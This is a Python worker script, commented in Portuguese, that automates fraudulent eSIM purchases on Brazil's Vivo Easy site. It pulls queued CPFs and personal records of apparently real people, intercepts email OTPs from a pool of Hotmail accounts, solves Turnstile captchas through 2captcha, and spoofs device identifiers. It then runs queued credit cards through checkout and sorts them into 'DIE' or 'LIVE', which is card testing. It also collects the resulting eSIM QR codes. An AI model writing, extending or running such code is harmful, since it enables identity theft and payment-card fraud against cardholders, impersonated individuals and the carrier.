#!/usr/bin/env python3
"""
Worker independente — processa fila de jobs do painel Docker.
Roda: python worker.py [--threads N]
"""
import sys, os, time, random, threading, argparse, re, hashlib, json, uuid
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import httpx
from datetime import datetime
from pathlib import Path

import db
import hotmail_pool
import cpf_fila
from config import (
    WORKER_THREADS, MAX_USOS_CARTAO, USE_PROXY, PROXY_URL,
    TWOCAPTCHA_KEY, LOGS_DIR,
)

os.system("")
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
B = "\033[1m"; D = "\033[90m"; W = "\033[0m"

# ── Turnstile ────────────────────────────────────────────────────────
TURNSTILE_SITEKEY = "0x4AAAAAAA7qpmxU744Cb0ok"
TURNSTILE_URL = "https://easy.vivo.com.br/alta/checkout/forma-de-pagamento"

def _get_2captcha_key() -> str:
    """Pega key do DB (admin define) ou fallback pra env/config."""
    key = db.get_setting("2captcha_key", "")
    return key if key else TWOCAPTCHA_KEY

def consultar_saldo_2captcha() -> str:
    key = _get_2captcha_key()
    if not key:
        return "sem key"
    try:
        r = requests.get("http://2captcha.com/res.php", params={
            "key": key, "action": "getbalance", "json": 1,
        }, timeout=10)
        data = r.json()
        return f"${data['request']}" if data.get("status") == 1 else "??"
    except:
        return "??"

def consultar_saldo_2captcha_float() -> float:
    """Retorna saldo como float pra calcular gasto."""
    key = _get_2captcha_key()
    if not key:
        return 0.0
    try:
        r = requests.get("http://2captcha.com/res.php", params={
            "key": key, "action": "getbalance", "json": 1,
        }, timeout=10)
        data = r.json()
        return float(data["request"]) if data.get("status") == 1 else 0.0
    except:
        return 0.0

def resolver_turnstile(timeout=120):
    key = _get_2captcha_key()
    if not key:
        return "", "sem key"
    saldo_antes = consultar_saldo_2captcha_float()
    saldo = f"${saldo_antes:.2f}"
    try:
        r = requests.post("http://2captcha.com/in.php", data={
            "key": key, "method": "turnstile",
            "sitekey": TURNSTILE_SITEKEY, "pageurl": TURNSTILE_URL, "json": 1,
        }, timeout=15)
        data = r.json()
        if data.get("status") != 1:
            return "", saldo
        task_id = data["request"]
        for i in range(timeout // 5):
            time.sleep(5)
            r = requests.get("http://2captcha.com/res.php", params={
                "key": key, "action": "get", "id": task_id, "json": 1,
            }, timeout=10)
            data = r.json()
            if data.get("status") == 1:
                saldo_depois = consultar_saldo_2captcha_float()
                gasto = saldo_antes - saldo_depois
                if gasto > 0:
                    db.record_captcha_spend(gasto)
                return data["request"], f"${saldo_depois:.2f}"
            if "CAPCHA_NOT_READY" not in str(data.get("request", "")):
                return "", saldo
    except Exception as e:
        print(f"  {R}[turnstile] {e}{W}")
    return "", saldo

# ── Sync ID ──────────────────────────────────────────────────────────
SYNC_ID_FILE = os.path.join(os.path.dirname(__file__), "sync_id_easy.txt")
def _load_sync_id():
    try:
        if os.path.exists(SYNC_ID_FILE):
            return open(SYNC_ID_FILE).read().strip()
    except:
        pass
    return ""
CACHED_SYNC_ID = _load_sync_id()

# ── Proxy ────────────────────────────────────────────────────────────
PROXIES = {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None

# ── Lock CPF (evita race condition) ──────────────────────────────────
_cpf_lock = threading.Lock()

# ── Planos ───────────────────────────────────────────────────────────
PLANOS = [
    {"id": "d9b707a3-8acb-40fe-b22f-abd11b60be06", "nome": "23GB Mensal (R$35)", "plans": "15"},
    {"id": "9a443399-c1d3-4a00-8c05-f962b54c27f0", "nome": "28GB Mensal (R$45)", "plans": "20"},
    {"id": "6883a579-da3a-4c6f-a205-3794bc464aeb", "nome": "33GB Mensal (R$55)", "plans": "25"},
]
BONUS_CODE = "EASY3GB"

def sortear_plano():
    p = random.choice(PLANOS)
    return p["id"], p["nome"], p["plans"]

def gerar_senha(length=6):
    chars = "abcdefghijkmnpqrstuvwxyz23456789"
    return "".join(random.choice(chars) for _ in range(length))


# ══════════════════════════════════════════════════════════════════════════
#  VivoEasyCartao — Classe core (copiada de vivo_easy_cartao.py)
#  Adaptada para standalone Docker
# ══════════════════════════════════════════════════════════════════════════

class VivoEasyCartao:
    BASE = "https://easy.vivo.com.br"
    BFF  = "https://easy.vivo.com.br/bff"

    def __init__(self, offer_id, offer_nome, plans_param):
        self.offer_id = offer_id
        self.offer_nome = offer_nome
        self.plans_param = plans_param
        self.sess = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[502,503,504])
        self.sess.mount("https://", HTTPAdapter(max_retries=retry))
        if PROXIES:
            self.sess.proxies.update(PROXIES)
        self.sess.verify = False
        self.device_uuid = str(uuid.uuid4())
        self.mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        self.senha_plain = gerar_senha()
        self.senha_hash = hashlib.sha256(self.senha_plain.encode()).hexdigest()
        self.token = ""
        self.customer_id = ""
        self.order_code = ""
        self.msisdn = ""
        self.logs = []
        self._captcha_saldo = ""
        self._bytes_total = 0
        self._headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "pt-BR,pt;q=0.9",
            "x-organization-slug": "vivo",
            "x-app-os": "WEB",
            "x-device-uuid": self.device_uuid,
            "x-device-wifiMacAddress": self.mac,
            "Referer": f"{self.BASE}/alta/cadastro",
            "Origin": self.BASE,
        }

    def _log(self, step, status, resp=""):
        self.logs.append({"step": step, "status": status, "resp": str(resp)[:500]})

    def _update_token(self, r):
        t = r.headers.get("x-access-token", "")
        if t:
            self.token = t
            self._headers["Authorization"] = f"Bearer {t}"

    def _track_bytes(self, r):
        try:
            self._bytes_total += len(r.request.url or "") + len(r.request.body or b"") + len(r.content or b"")
        except:
            pass

    def _get(self, path, **kw):
        r = self.sess.get(f"{self.BFF}{path}", headers=self._headers, timeout=20, **kw)
        self._update_token(r)
        self._track_bytes(r)
        return r

    def _post(self, path, **kw):
        r = self.sess.post(f"{self.BFF}{path}", headers=self._headers, timeout=30, **kw)
        self._update_token(r)
        self._track_bytes(r)
        return r

    def _put(self, path, **kw):
        r = self.sess.put(f"{self.BFF}{path}", headers=self._headers, timeout=20, **kw)
        self._update_token(r)
        self._track_bytes(r)
        return r

    def step0_init_session(self):
        """Inicializa sessão (cookies + setup calls). Retorna (ok, reason)."""
        url = f"{self.BASE}/?plans=EASY{self.plans_param}GB,EASY{self.plans_param}GB,EASY{self.plans_param}GB"
        for attempt in range(5):
            try:
                r = self.sess.get(url, headers=self._headers, timeout=15)
                if r.status_code == 200:
                    label = "PROXY" if PROXIES else "DIRETO"
                    print(f"  Home: {r.status_code} | Cookies: {len(self.sess.cookies)} | {label}")
                    break
                elif r.status_code == 403:
                    if attempt < 4:
                        time.sleep(2)
                        continue
                    print(f"  Home: 403 após 5 tentativas | {'PROXY' if PROXIES else 'DIRETO'}")
                    return False, f"home_403"
            except Exception as e:
                if attempt < 4:
                    time.sleep(2)
                    continue
                return False, f"home_err: {str(e)[:100]}"

        try:
            self.sess.get(f"{self.BASE}/_/feature-flags/status", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/maintenance", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/adherence/device/status", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/bonus/{BONUS_CODE}/v4?isForeigner=true", headers=self._headers, timeout=10)
            for _ in range(3):
                r = self._put("/_/adherence-recovery", json={})
                if r.status_code in (200, 201, 204):
                    break
                time.sleep(1)
            self.sess.get(f"{self.BASE}/_/catalogs/plans/v3", headers=self._headers, timeout=10)
            self._post("/_/adherence/web-checkout/v2", json={"offerId": self.offer_id})
            self.sess.get(f"{self.BASE}/_/flow-options", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/e-sim/types", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/alta/cadastro", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/feature-flags/status", headers=self._headers, timeout=10)
            self.sess.get(f"{self.BASE}/_/adherence/device/status", headers=self._headers, timeout=10)
        except:
            pass
        self._log("step0", 200)
        return True, ""

    def step1_setup(self):
        try:
            payload = {"offers": [{"offerId": self.offer_id}], "bonusCode": BONUS_CODE}
            r = self._post("/checkout/offers/v2?isForeigner=false", json=payload)
            self._log("step1_offers", r.status_code, r.text[:300] if r.text else "")
            if r.status_code in (200, 201):
                return True, ""
            body = r.text[:150] if r.text else ""
            return False, f"offers_{r.status_code}: {body}"
        except Exception as e:
            return False, f"offers_err: {str(e)[:100]}"

    def step2_validate_cpf(self, cpf: str, nasc: str):
        try:
            r = self._post("/cpf/validate", json={"cpf": cpf})
            self._log("step2_cpf", r.status_code)
            if r.status_code not in (200, 201):
                return False, f"cpf_validate_{r.status_code}: {r.text[:150]}"
            r = self._get(f"/customer/validate-cpf/{cpf}")
            self._log("step2_validate", r.status_code)
            if r.status_code not in (200, 201):
                return False, f"validate_cpf_{r.status_code}: {r.text[:150]}"
            r = self._post("/cpf/validate/birth-date", json={"birthDate": nasc, "cpf": cpf})
            self._log("step2_birth", r.status_code)
            if r.status_code in (200, 201, 204):
                return True, ""
            return False, f"birth_{r.status_code}: {r.text[:150]}"
        except Exception as e:
            return False, f"cpf_err: {str(e)[:100]}"

    def step3_validate_email(self, email: str) -> bool:
        try:
            r = self._get(f"/validate-email/{email}")
            self._log("step3_email", r.status_code)
            return True
        except:
            return False

    def step4_send_otp(self, email: str, nome: str):
        try:
            r = self._post("/token/send?isForeigner=false", json={
                "tokenType": "EMAIL", "email": email, "clientName": nome,
            })
            self._log("step4_otp", r.status_code)
            if r.status_code in (200, 201):
                return True, ""
            return False, f"otp_send_{r.status_code}: {r.text[:150]}"
        except Exception as e:
            return False, f"otp_err: {str(e)[:100]}"

    def step5_activate_otp(self, email: str, nome: str, otp: str):
        try:
            r = self._post("/token/activate", json={
                "tokenType": "EMAIL", "email": email, "clientName": nome,
                "token": otp,
            })
            self._log("step5_activate", r.status_code)
            self._update_token(r)
            if r.status_code in (200, 201):
                return True, ""
            return False, f"otp_activate_{r.status_code}: {r.text[:150]}"
        except Exception as e:
            return False, f"otp_err: {str(e)[:100]}"

    def step5b_esim_types(self):
        try:
            self._get("/e-sim/types")
            self._get("/adherence/esim/compatible-devices")
        except:
            pass

    def step6_get_cep(self, cep: str):
        try:
            r = self._get(f"/cep?postcode={cep}&simType=E_SIM")
            self._log("step6_cep", r.status_code)
            if r.status_code == 200:
                return r.json()
        except:
            pass
        return None

    def step7_register_customer(self, dados: dict):
        try:
            payload = {
                "name": dados["nome"],
                "motherName": dados.get("nome_mae", ""),
                "documentType": "CPF",
                "document": dados["cpf"],
                "password": self.senha_hash,
                "birthDate": dados["nasc"],
                "contactMsisdn": dados.get("phone", ""),
                "addresses": [{
                    "zipCode": dados["cep"],
                    "street": dados.get("logradouro", ""),
                    "state": dados.get("uf", ""),
                    "referencePoint": "",
                    "district": dados.get("bairro", "CENTRO"),
                    "complement": "",
                    "number": dados.get("numero", "100"),
                    "city": dados.get("cidade", ""),
                    "typeAddress": "DELIVERY",
                }],
                "receiveOffers": True,
                "simType": "E_SIM",
                "deviceBrand": "Samsung",
                "deviceModel": "Galaxy S20 Ultra",
                "bonusCode": BONUS_CODE,
                "msisdnToPort": None,
                "type": "ALTA",
            }
            r = self._post("/customer/v2?isForeigner=false", json=payload)
            self._log("step7_customer", r.status_code, r.text[:300])
            if r.status_code in (200, 201):
                try:
                    self.customer_id = r.json().get("id", "")
                except:
                    pass
                return True, ""
            return False, f"customer_{r.status_code}: {r.text[:150]}"
        except Exception as e:
            return False, f"customer_err: {str(e)[:100]}"

    def step8_select_number(self):
        try:
            r = self._post("/customer/msisdn", json={})
            self._log("step8_msisdn", r.status_code)
            if r.status_code != 200:
                return False, f"msisdn_{r.status_code}: {r.text[:150]}"
            self._update_token(r)
            data = r.json()
            numbers = data.get("resourceNumbers", [])
            if not numbers:
                return False, "sem_numeros_disponiveis"
            chosen_id = numbers[0]["resource"]["id"]
            chosen_num = numbers[0]["resource"]["value"]

            # Validar reserva (com Topaz x-sync-id)
            validate_payload = {"idMsisdn": chosen_id, "offers": [{"offerId": self.offer_id}]}
            hdr = dict(self._headers)
            hdr["x-channel"] = "DESKTOP_BROWSER"
            if CACHED_SYNC_ID:
                hdr["x-sync-id"] = CACHED_SYNC_ID
            r = self.sess.post(f"{self.BFF}/customer/msisdn/reservation/validate",
                               headers=hdr, json=validate_payload, timeout=20)
            self._update_token(r)
            self._log("step8_validate", r.status_code)
            if r.status_code not in (200, 204):
                return False, f"msisdn_validate_{r.status_code}: {r.text[:150]}"

            # Reservar
            r = self._post("/customer/msisdn/reservation", json={"id": chosen_id})
            self._log("step8_reserve", r.status_code)
            if r.status_code == 200:
                self._update_token(r)
                self.msisdn = r.json().get("msisdn", chosen_num)
                return True, ""
            return False, f"msisdn_reserve_{r.status_code}: {r.text[:150]}"
        except Exception as e:
            return False, f"msisdn_err: {str(e)[:100]}"

    def step9_checkout(self, cpf: str, nome: str, cartao: dict):
        try:
            # Resumo do pedido
            checkout_body = {"offers": [{"offerId": self.offer_id}], "bonusCode": BONUS_CODE}
            r = self._post("/checkout/purchase/v2?isForeigner=false", json=checkout_body)
            self._log("step9_purchase", r.status_code, r.text[:300])
            if r.status_code == 200:
                self._update_token(r)

            # Captcha
            turnstile_token, saldo = resolver_turnstile()
            self._captcha_saldo = saldo
            if not turnstile_token:
                self._log("step9_turnstile", 0, "timeout")
                return False, "captcha_timeout"

            # Enviar cartão (payload igual ao original)
            card_payload = {
                "cardName": cartao.get("name") or nome,
                "cvv": cartao["cvv"],
                "month": cartao["month"],
                "number": cartao["number"],
                "year": cartao["year"],
                "cpf": cpf,
            }
            cc_headers = dict(self._headers)
            cc_headers["x-site-key"] = turnstile_token
            cc_headers["Referer"] = "https://easy.vivo.com.br/alta/checkout/forma-de-pagamento"
            r = self.sess.post(f"{self.BFF}/credit-card", headers=cc_headers,
                               json=card_payload, timeout=30)
            self._update_token(r)
            self._log("step9_creditcard", r.status_code, r.text[:300])
            if r.status_code not in (200, 201):
                # 502/503 = servidor caiu, retry
                if r.status_code in (502, 503, 504):
                    return False, "RETRY"
                # Extrair title da resposta JSON pra msg real
                try:
                    err_data = r.json()
                    code = err_data.get("code", "")
                    title = err_data.get("title", "").replace("[error_image]\n", "").strip()
                    return False, f"{code}: {title}" if title else f"creditcard_{r.status_code}: {r.text[:150]}"
                except:
                    return False, f"creditcard_{r.status_code}: {r.text[:100]}"

            # Finalizar compra (payload igual ao original)
            purchase_payload = {
                "paymentMethod": "CREDIT_CARD",
                "cvv": cartao["cvv"],
                "offers": [{"offerId": self.offer_id}],
                "bonusCode": BONUS_CODE,
            }
            purchase_headers = dict(self._headers)
            purchase_headers["Referer"] = "https://easy.vivo.com.br/alta/checkout/forma-de-pagamento"
            if self.customer_id:
                purchase_headers["x-easy-clientId"] = str(self.customer_id)
            r = self.sess.post(f"{self.BFF}/purchase", headers=purchase_headers,
                               json=purchase_payload, timeout=30)
            self._update_token(r)
            self._log("step9_purchase_final", r.status_code, r.text[:500])

            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    self.order_code = data.get("orderId", data.get("code", data.get("id", "OK")))
                except:
                    pass
                return True, ""
            # 502/503 no purchase = retry
            if r.status_code in (502, 503, 504):
                return False, "RETRY"
            # Extrair title da resposta de purchase também
            try:
                err_data = r.json()
                code = err_data.get("code", "")
                title = err_data.get("title", "").replace("[error_image]\n", "").strip()
                return False, f"{code}: {title}" if title else f"purchase_{r.status_code}: {r.text[:150]}"
            except:
                return False, f"purchase_{r.status_code}: {r.text[:100]}"
        except Exception as e:
            self._log("step9_exception", 0, str(e))
            err_str = str(e).lower()
            if "timeout" in err_str or "timed out" in err_str or "connectionerror" in err_str or "connection" in err_str:
                return False, "RETRY"
            return False, f"checkout_err: {str(e)[:100]}"

    def save_log(self, cpf: str):
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = LOGS_DIR / f"{cpf}_{ts}.json"
            with open(path, "w") as f:
                json.dump({"cpf": cpf, "logs": self.logs, "order": self.order_code,
                           "msisdn": self.msisdn}, f, indent=2)
        except:
            pass


# ══════════════════════════════════════════════════════════════════════════
#  eSIM QR Code Monitor — Poll inbox pós-compra
# ══════════════════════════════════════════════════════════════════════════

QR_DIR = LOGS_DIR.parent / "qrcodes"
QR_DIR.mkdir(parents=True, exist_ok=True)

_RE_QR_URL = re.compile(r'(https?://[^\s"<>]*qr-code-generation[^\s"<>]*)', re.IGNORECASE)

def _poll_esim_qr(job_id: int, email: str, order_code: str, timeout: int = 600):
    """Poll inbox do hotmail buscando email com QR code do eSIM."""
    start = time.time()
    seen = set()

    # Captura mids existentes pra ignorar
    msgs = hotmail_pool.checar_inbox(email)
    for m in msgs:
        seen.add(m.get("mid", ""))

    try:
        while time.time() - start < timeout:
            time.sleep(15)
            msgs = hotmail_pool.checar_inbox(email)
            for m in msgs:
                mid = m.get("mid", "")
                if mid in seen:
                    continue
                seen.add(mid)
                subject = str(m.get("subject", "")).lower()
                if "instale" not in subject and "ative" not in subject and "esim" not in subject:
                    continue

                # Ler corpo completo
                body = hotmail_pool.ler_mensagem(email, mid)
                if not body:
                    continue

                import html as html_mod
                body_decoded = html_mod.unescape(body)
                qr_match = _RE_QR_URL.search(body_decoded)
                if not qr_match:
                    continue

                qr_url = qr_match.group(1)

                # Verifica se esse QR já foi usado por outro job
                if db.qr_url_ja_usada(qr_url, job_id):
                    print(f"  {Y}[job {job_id}] QR duplicado ignorado (já usado por outro job){W}")
                    continue

                # Baixar QR PNG
                qr_path = ""
                try:
                    r = httpx.get(qr_url, timeout=15, follow_redirects=True)
                    if r.status_code == 200 and len(r.content) > 500:
                        fname = f"{order_code or job_id}.png"
                        qr_path = str(QR_DIR / fname)
                        with open(qr_path, "wb") as f:
                            f.write(r.content)
                except:
                    pass

                db.update_job(job_id, qr_url=qr_url, qr_path=qr_path)
                print(f"  {G}[job {job_id}] QR code capturado! {qr_url[:60]}...{W}")
                return

        print(f"  {D}[job {job_id}] QR code timeout ({timeout}s){W}")
    finally:
        # SEMPRE devolve email ao pool quando terminar (capturou ou timeout)
        hotmail_pool.devolver_email(email)


def _qr_monitor_loop(stop_event: threading.Event):
    """Background loop: checa periodicamente jobs success sem QR e tenta capturar."""
    while not stop_event.is_set():
        try:
            pending = db.jobs_success_sem_qr(max_age_hours=24)
            for job in pending:
                if stop_event.is_set():
                    break
                email = job.get("email", "")
                order_code = job.get("order_code", "")
                job_id = job["id"]
                job_created = int(job.get("created_at", 0))
                if not email:
                    continue
                # Só busca emails recebidos DEPOIS que o job foi criado
                msgs = hotmail_pool.checar_inbox(email, timestamp=job_created)
                for m in msgs:
                    subject = str(m.get("subject", "")).lower()
                    if "instale" not in subject and "ative" not in subject and "esim" not in subject:
                        continue
                    body = hotmail_pool.ler_mensagem(email, m.get("mid", ""))
                    if not body:
                        continue
                    import html as html_mod
                    body_decoded = html_mod.unescape(body)
                    qr_match = _RE_QR_URL.search(body_decoded)
                    if not qr_match:
                        continue
                    qr_url = qr_match.group(1)
                    # Verifica se esse QR já foi usado por outro job
                    if db.qr_url_ja_usada(qr_url, job_id):
                        print(f"  {Y}[QR monitor] job {job_id} QR duplicado ignorado{W}")
                        continue
                    qr_path = ""
                    try:
                        r = httpx.get(qr_url, timeout=15, follow_redirects=True)
                        if r.status_code == 200 and len(r.content) > 500:
                            fname = f"{order_code or job_id}.png"
                            qr_path = str(QR_DIR / fname)
                            with open(qr_path, "wb") as f:
                                f.write(r.content)
                    except:
                        pass
                    db.update_job(job_id, qr_url=qr_url, qr_path=qr_path)
                    print(f"  {G}[QR monitor] job {job_id} QR capturado! {qr_url[:60]}...{W}")
                    break
                time.sleep(2)
        except Exception as e:
            print(f"  {R}[QR monitor] erro: {e}{W}")
        # Checa a cada 60s
        for _ in range(60):
            if stop_event.is_set():
                break
            time.sleep(1)


# ══════════════════════════════════════════════════════════════════════════
#  PROCESSAR JOB
# ══════════════════════════════════════════════════════════════════════════

def _job_cancelled(job_id: int) -> bool:
    """Checa se job foi cancelado no DB (pra parar mid-flight)."""
    j = db.get_job(job_id)
    return j is not None and j.get("status") == "cancelled"


def processar_job(job: dict):
    job_id = job["id"]
    # Checa se worker está parado
    if db.get_setting("worker_stop", "false") == "true":
        print(f"  {Y}[job {job_id}] Worker parado, marcando como failed{W}")
        db.update_job(job_id, status="failed", error_msg="worker_stopped")
        return

    card_display = f"****{job['card_number'][-4:]}"
    uf_filter = job["uf"] if job["uf"] != "ALL" else None
    email = ""

    print(f"  {Y}[job {job_id}]{W} Iniciando | Card {card_display} | UF={job['uf']}")

    # 1. CPF (Supabase — pool infinito)
    with _cpf_lock:
        if uf_filter:
            batch = cpf_fila.pegar_batch_cpfs(1, uf=uf_filter)
        else:
            batch = cpf_fila.pegar_batch_cpfs(1)
        cpf_data = batch[0] if batch else None
        if cpf_data:
            cpf_fila.marcar_usado(cpf_data["cpf"])
    if not cpf_data:
        print(f"  {R}[job {job_id}]{W} Sem CPF")
        db.update_job(job_id, status="failed", error_msg="sem_cpf")
        return

    cpf = cpf_data["cpf"]
    nome = cpf_data.get("nome", "")
    nasc = cpf_data.get("nasc", "")
    uf = cpf_data.get("uf", "")
    cep = str(cpf_data.get("cep", "")).zfill(8)
    ddd = str(cpf_data.get("ddd", "11"))
    phone = cpf_data.get("phone", "")
    nome_mae = cpf_data.get("nome_mae", "")
    logradouro = cpf_data.get("logradouro", "")
    numero = cpf_data.get("numero", "100") or "100"
    bairro = cpf_data.get("bairro", "CENTRO") or "CENTRO"
    cidade = cpf_data.get("cidade", "")

    if not phone or len(phone) < 10:
        phone = f"{ddd}9{''.join([str(random.randint(0,9)) for _ in range(8)])}"
    if not nasc:
        db.update_job(job_id, status="failed", error_msg="cpf_sem_nascimento", cpf=cpf)
        return

    db.update_job(job_id, cpf=cpf)

    # 2. Email (hotmail do pool)
    email = hotmail_pool.pegar_email()
    if not email:
        db.update_job(job_id, status="failed", error_msg="sem_email")
        return
    db.update_job(job_id, email=email)

    # 3. Fluxo Vivo Easy
    def _retry(reason):
        """Retry: re-enfileira o job com novo CPF (não perde o cartão)."""
        # Se worker está parado, não re-enfileira
        if db.get_setting("worker_stop", "false") == "true":
            print(f"  {Y}[job {job_id}] Worker parado, não re-enfileirando{W}")
            db.update_job(job_id, status="failed", error_msg=f"worker_stopped: {reason}")
            hotmail_pool.devolver_email(email)
            return
        print(f"  {Y}[job {job_id}] RETRY ({reason}) — volta pra fila{W}")
        db.update_job(job_id, status="queued", error_msg="", cpf="", email="", current_step="")
        hotmail_pool.devolver_email(email)

    try:
        if _job_cancelled(job_id):
            hotmail_pool.devolver_email(email)
            return

        offer_id, offer_nome, plans_param = sortear_plano()
        vivo = VivoEasyCartao(offer_id=offer_id, offer_nome=offer_nome, plans_param=plans_param)
        db.update_job(job_id, plano=offer_nome, current_step="SESSÃO")

        ok, reason = vivo.step0_init_session()
        if not ok:
            _retry(reason or "session_fail")
            return

        if _job_cancelled(job_id):
            hotmail_pool.devolver_email(email)
            return

        db.update_job(job_id, current_step="OFERTA")
        ok, reason = vivo.step1_setup()
        if not ok:
            _retry(reason or "setup_fail")
            return

        if _job_cancelled(job_id):
            hotmail_pool.devolver_email(email)
            return

        db.update_job(job_id, current_step="CPF")
        ok, reason = vivo.step2_validate_cpf(cpf, nasc)
        if not ok:
            _retry(reason or "cpf_rejeitado")
            return

        if _job_cancelled(job_id):
            hotmail_pool.devolver_email(email)
            return

        db.update_job(job_id, current_step="EMAIL")
        vivo.step3_validate_email(email)

        # Captura mids antigos
        mids_antigos = set()
        msgs = hotmail_pool.checar_inbox(email)
        for m in msgs:
            mids_antigos.add(m.get("mid", ""))

        if _job_cancelled(job_id):
            hotmail_pool.devolver_email(email)
            return

        db.update_job(job_id, current_step="OTP")
        ok, reason = vivo.step4_send_otp(email, nome)
        if not ok:
            _retry(reason or "otp_envio_falhou")
            return

        print(f"  {D}📨 OTP enviado para: {email}{W}")

        db.update_job(job_id, current_step="OTP ⏳")
        otp_code = hotmail_pool.extrair_otp_vivo(email, timeout=120, mids_antigos=mids_antigos)
        if not otp_code:
            _retry("otp_timeout")
            return

        db.update_job(job_id, current_step="OTP OK")
        ok, reason = vivo.step5_activate_otp(email, nome, otp_code)
        if not ok:
            _retry(reason or "otp_invalido")
            return

        db.update_job(job_id, current_step="CADASTRO")
        vivo.step5b_esim_types()

        cep_data_vivo = vivo.step6_get_cep(cep)

        dados = {
            "cpf": cpf, "nome": nome, "phone": phone, "nasc": nasc,
            "nome_mae": nome_mae, "cep": cep, "logradouro": logradouro,
            "numero": numero, "bairro": bairro, "cidade": cidade, "uf": uf,
            "email": email,
        }
        if cep_data_vivo:
            dados["logradouro"] = cep_data_vivo.get("streetName", logradouro)
            dados["bairro"] = cep_data_vivo.get("locality", bairro)
            dados["cidade"] = cep_data_vivo.get("city", cidade)
            dados["uf"] = cep_data_vivo.get("stateOrProvince", uf)

        ok, reason = vivo.step7_register_customer(dados)
        if not ok:
            _retry(reason or "cadastro_falhou")
            return

        db.update_job(job_id, current_step="NÚMERO")
        ok, reason = vivo.step8_select_number()
        if not ok:
            _retry(reason or "numero_falhou")
            return

        cartao = {
            "number": job["card_number"], "cvv": job["card_cvv"],
            "month": job["card_month"], "year": job["card_year"],
            "name": job["card_name"] or nome, "bandeira": job.get("card_bandeira", ""),
        }
        cycle = job.get("cycle", 1) or 1
        db.update_job(job_id, current_step=f"CAPTCHA C{cycle}")
        ok, reason = vivo.step9_checkout(cpf, nome, cartao)
        if not ok:
            if reason == "RETRY":
                _retry("server_502")
                return
            if "CUSTOMER_NOT_FOUND" in (reason or ""):
                print(f"  {Y}[job {job_id}] CUSTOMER_NOT_FOUND — cartao ok, retry com outro CPF{W}")
                _retry("customer_not_found")
                return

            # Classificar DIE vs LIVE
            reason_lower = (reason or "").lower()
            DIE_KEYWORDS = [
                "invalid", "invalido", "expirad", "expired",
                "bloqueado", "blocked", "roubado", "stolen", "lost",
                "restri", "cancelado", "cancelled", "fraude", "fraud",
                "numero do cartao", "card_number", "dados do cartao",
                "autorizou", "autorizado", "generic_exception",
                "do_not_honor", "not_authorized", "not authorized",
                "operadora", "refused", "declined", "recusad",
                "cvv", "wrong_cvv", "codigo de seguranca", "security_code", "security code",
            ]
            is_die = any(kw in reason_lower for kw in DIE_KEYWORDS)

            if is_die:
                db.update_job(job_id, status="failed", error_msg=reason or "CARD DIE",
                              current_step=f"DIE C{cycle}")
                print(f"  {R}[job {job_id}] DIE C{cycle}: {reason[:80]}{W}")
                hotmail_pool.devolver_email(email)
                return

            # LIVE mas nao aprovou — proximo ciclo
            new_id = db.requeue_for_cycle(job)
            if new_id:
                db.update_job(job_id, status="failed", error_msg=reason or "CARD LIVE",
                              current_step=f"LIVE C{cycle}")
                print(f"  {Y}[job {job_id}] LIVE C{cycle} -> C{cycle+1} (new job #{new_id}): {reason[:60]}{W}")
            else:
                db.update_job(job_id, status="failed", error_msg=reason or "MAX_CYCLES",
                              current_step=f"LIVE C{cycle} MAX")
                print(f"  {R}[job {job_id}] LIVE C{cycle} MAX — 3 ciclos esgotados: {reason[:60]}{W}")
            hotmail_pool.devolver_email(email)
            return

        # SUCESSO
        print(f"  {G}{B}[job {job_id}] APROVADO C{cycle}! Pedido: {vivo.order_code} | {vivo.msisdn} | {card_display}{W}")
        db.update_job(job_id, status="success", order_code=str(vivo.order_code or ""),
                      msisdn=str(vivo.msisdn or ""), senha=vivo.senha_plain, current_step=f"APPROVED C{cycle}")
        vivo.save_log(cpf)

        # Marca CPF como aprovado no Supabase (remove da fila definitivamente)
        cpf_fila.registrar_resultado(cpf, order_id=str(vivo.order_code or ""), email=email, status="aprovado")

        # Poll inbox pra eSIM QR code (background)
        threading.Thread(target=_poll_esim_qr, args=(job_id, email, str(vivo.order_code or "")),
                         daemon=True).start()

    except Exception as e:
        print(f"  {R}[job {job_id}] EXCEPTION: {e}{W}")
        # Exceções genéricas = retry (não sabemos se é culpa do cartão)
        _retry(f"exception: {str(e)[:150]}")
    finally:
        # Registra bytes trafegados via proxy
        if vivo._bytes_total > 0:
            try:
                db.record_proxy_bytes(vivo._bytes_total)
            except:
                pass


# ══════════════════════════════════════════════════════════════════════════
def worker_loop(stop_event: threading.Event):
    while not stop_event.is_set():
        # Checa flag de parada no banco
        if db.get_setting("worker_stop", "false") == "true":
            time.sleep(5)
            continue

        db.clear_stale_processing(max_age_seconds=600)
        job = db.take_next_job()
        if not job:
            time.sleep(2)
            continue
        usos = db.count_card_uses(job["card_number"])
        if usos > MAX_USOS_CARTAO:
            db.update_job(job["id"], status="failed", error_msg="cartao_max_usos")
            continue
        try:
            processar_job(job)
        except Exception as e:
            print(f"  {R}Worker error: {e}{W}")
            db.update_job(job["id"], status="failed", error_msg=f"worker_error: {str(e)[:200]}")


def main():
    parser = argparse.ArgumentParser(description="Worker — Vivo Easy Docker")
    parser.add_argument("--threads", type=int, default=0)
    args = parser.parse_args()

    # Prioridade: --threads CLI > db setting > config.py env
    if args.threads > 0:
        num_threads = args.threads
    else:
        db_val = db.get_setting("worker_threads", "")
        num_threads = int(db_val) if db_val.isdigit() and int(db_val) > 0 else WORKER_THREADS

    print(f"{C}{B}{'═'*50}{W}")
    print(f"  {B}WORKER VIVO EASY DOCKER{W}")
    print(f"  Threads: {num_threads}")
    print(f"  Proxy: {'ON → ' + PROXY_URL if USE_PROXY else 'OFF'}")

    n = hotmail_pool.carregar_pool()
    print(f"  Hotmails: {n}")

    stats = db.get_stats()
    cpf_stats = db.count_cpfs()
    print(f"  Fila: {stats['queued']} queued | {stats['processing']} processing")
